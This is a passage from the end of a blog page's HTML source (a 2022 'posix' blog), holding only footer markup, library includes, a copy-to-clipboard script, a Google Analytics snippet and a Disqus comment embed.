$("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>